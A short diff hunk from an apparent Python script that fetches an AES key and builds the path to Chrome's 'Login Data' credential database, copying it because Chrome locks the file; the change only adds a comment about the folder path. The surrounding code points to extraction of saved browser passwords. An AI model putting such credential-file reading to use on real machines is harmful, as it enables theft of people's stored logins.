@@ -37,6 +37,7 @@ def main():
     # get the AES key
     key = get_encryption_key()
     # local sqlite Chrome database path
+    # enter the path of the Login Data folder if the error = folder is not found
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
     # copy the file to another location
     # as the database will be locked if chrome is currently running
